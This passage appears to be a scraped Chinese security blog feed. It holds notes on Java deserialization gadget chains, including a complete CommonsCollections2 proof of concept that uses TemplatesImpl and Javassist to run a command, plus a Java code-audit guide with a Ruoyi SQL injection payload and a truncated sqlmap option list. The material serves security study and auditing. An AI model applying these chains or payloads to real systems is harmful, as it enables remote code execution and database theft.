Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); constructor1.setAccessible(true); //创建Map类的代理对象 InvocationHandler InProxy = (InvocationHandler)constructor1.newInstance(Override.class,lazymap); //这里的第一个参数一般是Obj.getClass().getClassLoader()，但是ClassLoader.getSystemClassLoader()也没什么影响 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,InProxy); //创建新的AnnotationInvocationHandler对象，并且将proxyMap传入 Object handler = constructor1.newInstance(Override.class,proxyMap); FileOutputStream fileOutputStream = new FileOutputStream(&quot;D:\\\\Desktop\\\\JavaTester\\\\CC1\\\\src\\\\main\\\\java\\\\org\\\\example\\\\ser.txt&quot;); ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream); outputStream.writeObject(handler); outputStream.close(); fileOutputStream.close(); &#125; 执行序列化和反序列化后会报错，但是已经成功执行命令了，所以利用成功 Common Collection2 参考链接：https://www.yuque.com/tianxiadamutou/zcfd4v/fw3ag3 环境：java8、CommonsCollections 4.0 前言✨需要掌握的前置知识：javasist，ClassLoader#defineClass，TemplatesImpl javasist是一个处理字节码的类库，能够动态的修改class中的字节码为了介绍这个类。新建一个项目，导入这个依赖，导入依赖代码如下 12345&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.25.0-GA&lt;/version&gt;&lt;/dependency&gt; 使用步骤1、新建ClassPool ClassPool pool &#x3D; ClassPool.getDefault(); 2、指定类搜索路径 pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); 3、创建一个class文件对象 CtClass test &#x3D; pool.makeClass(“Evil”); 重新设置名称 String name &#x3D; “Evil” + System.nanoTime(); test.setName(name); 4、设置要继承的类 test.setSuperclass(pool.get(AbstractTranslet.class.getName())); 5、创建一个空的类初始化器（静态构造函数） CtConstructor constructor &#x3D; test.makeClassInitializer(); 6、将字节码插入到开头(可选) constructor.insertBefore(“System.out.println(&quot;Hello,Javasist&quot;);”); 7、指定文件路径 test.writeFile(“.&#x2F;“); 这个路径就是项目的根目录 示例代码 1234567891011121314151617181920import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import java.io.IOException;public class JavasistTest &#123; public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123; //新建一个classpool类型的对象 ClassPool pool = ClassPool.getDefault(); //添加类搜索路径 pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass test = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;System.out.println(\\&quot;Hello,Javasist\\&quot;);&quot;; test.setSuperclass(pool.get(AbstractTranslet.class.getName())); CtConstructor constructor = test.makeClassInitializer(); constructor.insertBefore(cmd); test.writeFile(&quot;./&quot;); &#125;&#125; 生成一个Evil.class文件，内容如下 12345678910111213141516//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;public class Evil extends AbstractTranslet &#123; static &#123; System.out.println(&quot;Hello,Javasist&quot;); &#125; public Evil() &#123; &#125;&#125; ClassLoader#defineClass 简介：ClassLoader是Java的类加载器，负责将字节码转化成内存中的Java类，ClassLoader有三个主要的函数loadClass、findClass、defineClass，其中defineClass的作用就是处理传入的字节码，将其处理成真正的Java类，这里因为后面需要用到defineClass方法，这里简单的介绍下 示例代码如下 123456789101112131415161718192021222324252627282930import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class JavasistTest &#123; public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123; //新建一个classpool类型的对象 ClassPool pool = ClassPool.getDefault(); //添加类搜索路径 pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass test = pool.makeClass(&quot;Evil&quot;); // String name = &quot;Evil&quot; + System.nanoTime(); // test.setName(name); String cmd = &quot;System.out.println(\\&quot;Hello,Javasist\\&quot;);&quot;; test.setSuperclass(pool.get(AbstractTranslet.class.getName())); CtConstructor constructor = test.makeClassInitializer(); //插入字节码到开头 constructor.insertBefore(cmd); test.writeFile(&quot;./&quot;); Class cls = Class.forName(&quot;java.lang.ClassLoader&quot;); Method method = cls.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class); method.setAccessible(true); byte[] bytes = test.toBytecode(); Class clsEvil = (Class) method.invoke(ClassLoader.getSystemClassLoader(),&quot;Evil&quot;,bytes,0,bytes.length); clsEvil.newInstance(); &#125; &#125; 执行后会将我们执行javassist生成的class文件中的字节码 注意：ClassLoader#defineClass返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，也就是说我们虽然构造了一个恶意的类能够使用这个defineClass加载，但是它不会执行静态方法，所以我们需要想办法调用返回的类的构造函数才能执行命令，如上面的代码使用clsEvil.newInstance()创建新的对象就会执行静态方法发 原因的话估计是这个ProtectionDomain类中方法的作用做了什么限制 但是这样需要明确调用构造函数并不太可能，所以我们可以尝试找一下没有显式的对定义域进行声明的defineClass方法 鼠标停在defineClass方法上按住alt+F7查找所有的重载方法，找到了接下来要介绍的TemplatesImpl类 TemplatesImpl一步步的分析，若是想要使用defineClass方法，则需要使用TemplatesImpl的内部类TransletClassLoaderTransletClassLoader.defineClass() 然后一层层的找，直到找到哪一个可以直接通过TemplatesImpl调用的 先查看调用TransletClassLoader的方法defineTransletClasses方法调用了TransletClassLoader 然后根据这个方法，最终找到一条链 12345TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TransletClassLoader.defineClass() 这里一层层的往上找是因为defineClass()方法在defineClass类中，找到defineTransletClasses()调用该类，但是是private方法，所以继续往上找，找到一个public方法newTransformer()，往上找还有一个方法getOutputProperties()也可以 所以接下来需要分析怎么通过以上的链实现调用TemplatesImpl中的defineClass()方法 我们从newTransformer()开始分析 首先我们新建一个TemplatesImpl对象，然后调用newTransformer()方法或者是getOutputProperties()方法，这里使用反射的方法进行操作方便点 12//创建一个实例TemplatesImpl templates = TemplatesImpl.class.newInstance(); 然后我们调用newTransformer()方法 1templates.newTransformer(); 但是这样是无法调用defineClass函数的，具体如下所示 调用newTransformer()方法是为了调用里面的getTransletInstance()方法，可以看到该方法中_name不等于null，_class等于null才可执行我们要执行的下一个函数defineTransletClasses() 我们转到声明处，发现是private属性的变量所以我们需要利用反射的方法将这两个值设置一下，结合上面的代码如下 123456789101112131415161718TemplatesImpl templates = TemplatesImpl.class.newInstance();Class temp = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);//获取成员变量_nameField _name = temp.getDeclaredField(&quot;_name&quot;);//因为是private属性，设置一下可以修改_name.setAccessible(true);//随便传入一个非null值_name.set(templates,&quot;tttt&quot;);//获取成员变量_classField _class = temp.getDeclaredField(&quot;_class&quot;);_class.setAccessible(true);//传入一个null值_class.set(templates,null)templates.newTransformer(); 继续回到分析，上一步已经到了getTransletInstance()，并且条件我们已经顺利满足，继续执行下一个函数defineTransletClasses() 可以看到需要实现两个条件，一个是_bytecodes不为null，其实就是要传入我们的恶意类的字节码，一个是父类要是ABSTRACT_TRANSLET，他们的类型和值如下所示 看了一下，AbstractTranslet是一个抽象类，只需要在利用javasist创建恶意字节代码时继承这个类就行了 然后调用defineClass方法需要新建TransletClassLoader对象loader，在其中定义了一个函数需要使用_tfactory，所以修改后的代码如下 1234567891011121314151617181920212223242526272829303132ClassPool pool = ClassPool.getDefault(); //添加类搜索路径 pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass test = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;System.out.println(\\&quot;Hello,Javasist\\&quot;);&quot;;//选择继承的类为AbstractTranslettest.setSuperclass(pool.get(AbstractTranslet.class.getName())); CtConstructor constructor = test.makeClassInitializer(); constructor.insertBefore(cmd); test.writeFile(&quot;./&quot;); byte[] bytes = test.toBytecode();TemplatesImpl templates = TemplatesImpl.class.newInstance();Class temp = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);//修改_name的值Field _name = temp.getDeclaredField(&quot;_name&quot;);_name.setAccessible(true);_name.set(templates,&quot;tttt&quot;);//修改_class的值Field _class = temp.getDeclaredField(&quot;_class&quot;);_class.setAccessible(true);_class.set(templates,null)//修改_bytecodes的值Field _bytecodes = temp.getDeclaredField(&quot;_bytecodes&quot;); _bytecodes.setAccessible(true); _bytecodes.set(templates,new byte[][]&#123;bytes&#125;);//修改_tfactory的值Field _tfactory = temp.getDeclaredField(&quot;_tfactory&quot;); _tfactory.setAccessible(true); _tfactory.set(templates,new TransformerFactoryImpl());//执行最外面的函数newTransformer()templates.newTransformer(); 这些前置知识到这里就分析完了，我们最后要利用这个TemplatesImpl去加载我们生成的恶意字节码，但是我们还缺一个反序列化的入口，这个入口接下来将在cc2链中介绍 CC2链条分析cc1的链加上PriorityQueue链 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;public class cc2Tester &#123; public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;); TransformingComparator transformingComparator = new TransformingComparator(chain); //也可通过构造函数直接进行传入 //PriorityQueue queue = new PriorityQueue(1,transformingComparator); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); field.setAccessible(true); field.set(queue,transformingComparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./evil.bin&quot;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./evil.bin&quot;)); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 先看一眼利用链 1234567891011121314ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TransletClassLoader.defineClass() newInstance() Runtime.getRuntime().exec(&quot;calc&quot;) 注意：这里可以使用CC1中的方法来构造我们的恶意类，然后利用CC2链中的PriorityQueue中的反序列化，但这个反序列化值能命令执行，使用加载字节码的方法可以代码执行 代码1InvokerTransformer.transform()和cc1中的一样，就是通过反射执行指定对象的函数，所以我们可以将这个TemplatesImpl中的newTransformer()方法传入其中 1234Constructor constructor =Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer)constructor.newInstance(&quot;newTransformer&quot;); 代码2按照CC1分析中的思路，我们还需要找到一个方法执行transform()，并且能够被反序列化 最后找到了TransformingComparator中的compare()方法 很神奇，commons-collections4中的这个类继承了序列化接口，而commons-collections3没有继承 可以看到compare()方法中调用了transform()方法 1TransformingComparator comparator = new TransformingComparator(transformer); 代码3但是这个类中的compare方法的参数是不可控的，所以我们需要寻找一个参数可控的compare方法，按住alt+F7查找所有的compare方法，PriorityQueue类中的siftDownUsingComparator()方法调用了comparator对象的compare方法，并且这个comparator对象也是可控的，并且传入的参数x会传到compare方法中，也就是这里会执行我们传入的TransformingComparator对象的compare方法 查找谁调用了siftDownUsingComparator()方法，发现是siftDown()方法，并且参数有x它的逻辑是如果comparator不为null就调用这个函数，所以我们需要使用反射修改这个值为 TransformingComparator对象 接着往上找，发现heapify()方法调用，并且x的值就是queue数组中的值 代码的逻辑就是将size右移一位然后减1，假如size是1的话就是那么化成二进制是01，向右移动一位就是00，然后减去1就是-1了，不会进入循环；如果是2的话，化成二进制就是0010，右移一位就是0001，然后减去1就是0，会进入循环，也就会执行siftDown()方法 继续往上找，直到找到readObject方法调用我们可控的方法 代码逻辑就是将queue中的每个值都反序列化，然后调用heapify()方法，由上一步的分析可以知道，只要我们控制queue的值就会调用我们分析的一层层的方法 queue是禁止反序列化的，size是private属性，且初始值是0所以queue和size只需要使用反射修改即可 注意：这里一开始因为queue前面有transient修饰让我有一些疑惑，加了这个关键字后这个不是不能进行序列化操作了吗？但是发现它是将queue里面的对象进行的序列化和反序列化，所以我想对我们的利用是没有影响的吧(纯推想，欢迎指正😉) 根据上面的分析，我们总共需要设置3个变量：queue、size、comparator 1234567891011121314PriorityQueue queue = new PriorityQueue(1); //设置queue的值 Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field=Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); //设置size的值 Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(queue,2); //设置comparator的值 Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); 完整poc代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.PriorityQueue;public class cc2Tester &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, CannotCompileException, NotFoundException, IOException, TransformerConfigurationException &#123; ClassPool pool = ClassPool.getDefault();//添加类搜索路径 pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass test = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;;//选择继承的类为AbstractTranslet test.setSuperclass(pool.get(AbstractTranslet.class.getName())); CtConstructor constructor1 = test.makeClassInitializer(); constructor1.insertBefore(cmd); test.writeFile(&quot;./&quot;); byte[] bytes = test.toBytecode(); TemplatesImpl templates = TemplatesImpl.class.newInstance(); Class temp = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);//修改_name的值 Field _name = temp.getDeclaredField(&quot;_name&quot;); _name.setAccessible(true); _name.set(templates,&quot;tttt&quot;);//修改_class的值 Field _class = temp.getDeclaredField(&quot;_class&quot;); _class.setAccessible(true); _class.set(templates,null);//修改_bytecodes的值 Field _bytecodes = temp.getDeclaredField(&quot;_bytecodes&quot;); _bytecodes.setAccessible(true); _bytecodes.set(templates,new byte[][]&#123;bytes&#125;);//修改_tfactory的值 Field _tfactory = temp.getDeclaredField(&quot;_tfactory&quot;); _tfactory.setAccessible(true); _tfactory.set(templates,new TransformerFactoryImpl());//执行最外面的函数newTransformer() templates.newTransformer(); Constructor constructor2 =Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class); constructor2.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer)constructor2.newInstance(&quot;newTransformer&quot;); TransformingComparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //设置queue的值 Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field=Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); //设置size的值 Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(queue,2); //设置comparator的值 Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); //序列化与反序列化 ObjectOutputStream serialize = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;)); serialize.writeObject(queue); serialize.close(); ObjectInputStream deserialize = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;)); deserialize.readObject(); deserialize.close(); &#125;&#125;","categories":[{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计/java/笔记/反序列化","slug":"代码审计-java-笔记-反序列化","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Java代码审计","slug":"Java代码审计","date":"2023-09-21T12:13:55.000Z","updated":"2024-11-09T10:19:18.634Z","comments":true,"path":"2023/09/21/Java代码审计/","permalink":"http://dale.us.kg/2023/09/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"参考链接java代码审计之路 - Afant1 - 博客园 (cnblogs.com) ✍内容Java环境配置java1.8+idea+tomcat IDEA常用快捷键F7步入|F8步过|F9到下一个断点|ALT+F8评估表达式|Ctrl+F 文件内查找字符串|双击Shift 查找任何内容，可搜索类、资源、配置项、方法等，还能搜索路径|Ctrl + N 按类名搜索类|Ctrl + F12 查看当前类结构|Ctrl + H 查看类的层次关系|Alt + F7 查找类或方法在哪被使用 下载地址java+idea+tomcat自己找 项目新建新建一个标准项目 在项目结构中配置JDK，然后在模块中选择新建web 然后添加artifacts 然后文件配置按照如下 然后设置就已经好了，但是java版本需要下最新版本的 javaweb基础servletjava服务模块，主要的业务逻辑就是用的这个模块 idea的servlet一般是继承httpservlet类 Filter过滤器模块 创建TargetFilter类： 要点1：实现javax.servlet.Filter接口 要点2：在doFilter()方法中执行过滤 要点3：如果满足过滤条件使用 chain.doFilter(request, response);放行 要点4：如果不满足过滤条件转发或重定向请求 附带问题：Thymeleaf模板渲染。这里我们选择的解决办法是跳转到一个Servlet，由Servlet负责执行模板渲染返回页面。 listener监听器 用于监听Web应用程序中的ServletContext，HttpSession 和HttpServletRequest等域对象的创建与销毁事件，以及监听这些域对象中的属性发生修改的事件。 ThymeleafThymeleaf是一种模板引擎，直接在html中的任意标签前面加上th:即可在后端修改其值 详细的用法可以参考官网、 VueAjax在实际应用中Ajax指的是：不刷新浏览器窗口，不做页面跳转，局部更新页面内容的技术。 使用原生的JavaScript程序执行Ajax极其繁琐，所以一定要使用框架来完成。而Axios就是目前最流行的前端Ajax框架。 使用Axios和使用Vue一样，导入对应的*.js文件即可。官方提供的script标签引入方式为： &lt;script src=&quot;https://unpkg.com/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt; Java远程调试Behinder.jar首先在命令行中输入如下 1java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=10.194.7.167:5005 Behinder.jar 然后去idea中新建一个项目，添加远程调用的配置 然后将jar包添加到库，打上断点即可调试 源码https://github.com/super9du/vhr-backend/tree/master https://github.com/JoyChou93/java-sec-code 审计思路参考链接：https://xz.aliyun.com/t/9173 确定系统框架Struts1 查看web.xml，里面有一个servlet内容如下 123&lt;servlet-class&gt; org.apache.struts.action.ActionServlet&lt;/servlet-class&gt; 它的路由会出现在&lt;init-param&gt;中的&lt;param-value&gt;中的配置文件中 例如struts-config.xml中的一个action如下 path就是路由，type就是服务代码 Struts2参考：https://xz.aliyun.com/t/9173 查看web.xml，查看filter，里面会有名为struts的过滤器 struts.xml文件 这个文件中有action的具体java文件路径信息 层次介绍action为业务逻辑处理层，action层接收来自视图层（.jsp（可以理解为前端吧，就是用户看到操作的那层））的请求，并接收请求参数，同时负责调用模型Model层方法来完成业务逻辑的处理，最后控制程序的流程，选择一个合适的视图，将结果显示给用户，一般这个目录下文件的特征表现为xxxxaction.java，比如NovyAction.java； dao为数据持久层，在这层中通常是用来做数据库请求处理的，增删查改都在这里，一般这个目录下文件的特征表现为xxxxDao.java，比如NovyDao.java。 在web运行处理请求时流程为业务逻辑处理层-数据持久层 SpringMVC 先查看web.xml，里面会有springMVC 查看Springmvc.xml查找各种controller类所在的位置 查看pom.xml各种依赖的引入 层次结构controller为控制层（业务逻辑），用来接收客户端的请求，然后调用Service层业务逻辑，获取到数据，传递数据给视图层（客户端）用于视觉呈现，一般请求的url在这里，比如 @Controller@RequestMapping(value &#x3D; “&#x2F;novy”) 则请求url为http://localhost/novy控制层的文件一般为xxxcontroller.java，比如NovyController.java Service是业务层，接收Controller层数据，与DAO&#x2F;Mapper层交互，处理业务逻辑，生成responseDTO数据并返回Controller层 ,该层文件一般为xxxServce.java，比如NovyService.java，此处是接口定义，就是定义一些方法，没有这些方法的实现，但是有时候数据操作会在这里发生（看开发） Implements是服务实现层（接口实现），用来处理一些方法的实现（这个方法干了啥干了啥），该层文件一般为xxxImpl.java，比如NovyImpl.java，impl 是把mapper和service进行整合的文件，有时候一些sql操作也会发生在这里 Mapper是数据持久层，对数据库进行数据持久化操作，他的方法语句是直接针对数据库操作的，数据持久层文件通常都是xxxMapper.xml，比如NovyMapper.xml Dao是数据接口层，一些数据请求（接口）会在这里发生（一般用于内部实现） Entity是实体处理层，用于存放我们的实体类，与数据库中的属性值基本保持一致（定义前端传来的请求参数） 在web运行时处理请求的流程为Controller-&gt;Service-&gt;impl-&gt;mapper Springboot和springmvc差不多 SSH框架struts2+spring+hibernate 寻找sql注入漏洞mybatis框架mybatis一般是使用#&#123;进行预编译，但是在order by的情况下必须使用$&#123;直接拼接，或者是一些其他情况使用了$&#123;，就可能会出现sql注入的问题 这里使用ruoyi框架为例子 审计方法 全局搜索$&#123;，文件类型限定为xml![[Pasted image 20241019145616.png]]如上图，直接点进去一个mapper文件查看即可 这里进入SysRoleMapper.xml文件![[Pasted image 20241019150554.png]] select标签中的id的值selectRoleList就是用到该mapper的方法parameterType的值SysRole就是需要传入的参数对象 然后就需要往上寻找入口点 寻找定义selectRoleList方法的java文件 xml文件一般是在resource&#x2F;mapper文件夹中，对应的mapper在java源代码的mapper文件夹中 正常来说直接使用ctrl+点击方法名就可以跳转到源文件，若是没有的话可以使用搜索功能找到定义该函数的mapper类型的java文件，如下第一个就是![[Pasted image 20241019151404.png]] 找到impl实现文件直接ctrl+单击即可![[Pasted image 20241019151503.png]] 寻找接口文件既然有实现文件，那么肯定也有接口文件，直接点击ctrl+u就可以跳转到 寻找入口文件(controller) 使用搜索功能，直接搜索selectRoleList方法，找到cotroller类型的文件![[Pasted image 20241019152031.png]]SysRoleController.java文件内容如下![[Pasted image 20241019152145.png]] 可以看到根路由是/system/role 对应的get方法的路由是/list，然后里面有参数role，可以看到role的类型是SysRole 搜索参数定义全局搜索SysRole的定义文件 ![[Pasted image 20241019152823.png]] SysRole.java文件![[Pasted image 20241019153112.png]] 可以发现，直接获取值，并且没有做任何的过滤 快捷方法 抓到xml文件中的可能的注入点后，直接使用搜索功能，找到使用对应的方法的controller类型的文件，和对应的参数类型的java文件，然后直接进行分析即可 寻找后端地址 若是有在线的项目，直接抓包登录看一下就知道了，还可以从源码中的application.yml文件中查看，或者是vue的vue.config.js文件中 ![[Pasted image 20241019154933.png]] 通过以上的分析，可以得出漏洞存在的路径是 12127.0.0.1：8086/system/role/list?roleId=1&amp;roleName-admin&amp;roleKey=1&amp;params[dataScope]=and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523# 大致上就是这些，剩下的就不加了 params[dataScope]这种形式是因为xml文件中定义是$&#123;params.dataScope&#125; Hibernate框架Hibernate框架一般没有sql注入漏洞，一般都是使用占位符的 审计方法 关键词检索1@Query 搜索完后，查看是否是使用占位符，若是直接拼接的话就是有漏的的 若是找到有漏洞的sql查询语句，使用如下方法跟踪到controller层假设寻找findall方法 ctrl+左键单击进入实现类 然后ctrl+左键点击上一层的方法findSide转到controller类 可以发现接口是core/task/view.do","categories":[{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计/java/笔记","slug":"代码审计-java-笔记","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0/"}]},{"title":"sqlmap","slug":"sqlmap","date":"2023-04-25T11:17:34.000Z","updated":"2024-11-09T10:19:19.132Z","comments":true,"path":"2023/04/25/sqlmap/","permalink":"http://dale.us.kg/2023/04/25/sqlmap/","excerpt":"","text":"✍内容sqlmap简介sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。 sqlmap常用命令-h 显示基本帮助信息 -hh 显示高级帮助信息 –version 显示版本号 -v 详细等级（0-6 默认 1） 0：只显示python错误以及重要信息 1：显示信息以及警告 2：显示debug消息 3：显示注入payload 4：显示http请求 5：显示http响应头· 6：显示http响应内容 Target-u 指定目标url -d 直接连接数据库 -l 从burp代理日志的解析目标 -r 从文件中加载http请求 -g 从google dork的结果作为目标url -c 从INI配置文件中加载选项 Request-A 指定user-agent头 -H 额外的header -method&#x3D; 指定HTTP方法（GET&#x2F;POST） &#x3D;&#x3D;–data&#x3D; 通过POST提交数据&#x3D;&#x3D; –param-del&#x3D; 指定参数分隔符 –cookie&#x3D; 指定cookie的值 –cookie-del&#x3D; 指定cookie分隔符 –drop-set-cookie 扔掉response中的set-cookie头 –random-agent 使用随机的user-agent头 –host&#x3D; 设置host头 –referer&#x3D; 指定referer头 –headers&#x3D; 额外的headers –auth-type&#x3D; http认证类型（Basic，NTLM，Digest） –auith-cred&#x3D; http认证凭证（账号：密码） –ignore-proxy 忽略系统代理（常用于扫描本地文件） –proxy&#x3D; 使用代理 –proxy-cred&#x3D; 代理认证证书（账号：密码） –delay&#x3D; 设置延迟时间（两个请求之间） –timeout&#x3D; 超时时来连接前等待（默认 30） –retries&#x3D; 连接超时时重试次数（默认 3） –randomize&#x3D; 随机更改指定的参数的值 –safe-url&#x3D; 在测试期间经常访问的URL –safe-post&#x3D; POST数据发送到安全的URL –safe-freq&#x3D; 两次请求之间穿插一个安全的URL –skip-urlencode 跳过payload数据的URL编码 –chunked 使用HTTP分块传输加密POST请求 –hpp 使用HTTP参数pollution方法（常用于绕过IPS&#x2F;IDS检测） –force-ssl 强制使用SSL&#x2F;HTTPS –eval&#x3D;value 请求之前提供Python代码（eg：”import hashlib;id2&#x3D;hashlib.md5(id).hexdigest()”） Optimization-o 打开所有优化开关 –predict-output 预测输出（与–threads不兼容） –keep-alive 建立长久的HTTP(S)连接 (与–proxy不兼容) –null-connection 空连接 –threads&#x3D;value 设置线程(默认 1) Injection-p 指定测试参数 –skip&#x3D; 跳过指定参数的测试 –skip-static 跳过测试静态的参数 –dbms&#x3D; 指定具体DBMS –os&#x3D; 指定DBMS操作系统 –invalid-bignum 使用大数字使值无效 –invalid-logical 使用逻辑符使值无效 –invalid-string 使用字符串使值无效 –no-cast 关闭payload铸造机制 –no-escape 关闭字符转义机制（默认自动开启） –prefix&#x3D; 加入payload前缀 –suffix&#x3D; 加入payload后缀 –tamper&#x3D; 指定使用的脚本 Detectiong–level&#x3D; 指定测试的等级（1-5 默认为1） –risk&#x3D; 指定测试的风险（0-3 默认为1） –string&#x3D; 登录成功时，页面所含有的“关键字” 用于证明已经登录成功 –not-string&#x3D; 登录成功时，页面所含有的“关键字” 用于证明已经登录失败 –code&#x3D; 查询为真时，匹配的HTTP代码 –smart 当有大量检测目标时，只选择基于错误的检测结果 –text-only 仅基于文本内容比较网页 –titles 仅基于标题比较网页 Techniques–technique&#x3D; 指定sql注入技术（默认BEUSTQ） –time-sec&#x3D; 基于时间注入检测相应的延迟时间（默认为5秒） –union-clos&#x3D; 进行查询时，指定列的范围 –union-char&#x3D; 指定暴力破解列数的字符 Fingerprint -f 查询目标DBMS版本指纹信息 Emuneration-a 查询所有 -b 查询目标DBMS banner信息 –current-user 查询目标DBMS当前用户 –current-db 查询目标DBMS当前数据库 –is-dba 查询目标DBMS当前用户是否为DBA –users 枚举目标DBMS所有的用户 –paswords 枚举目标DBMS用户密码哈希值 –privileges 枚举目标DBMS用户的权限 –roles 枚举DBMS用户的角色 &#x3D;&#x3D;–dbs 枚举DBMS所有的数据库&#x3D;&#x3D; &#x3D;&#x3D;–tables 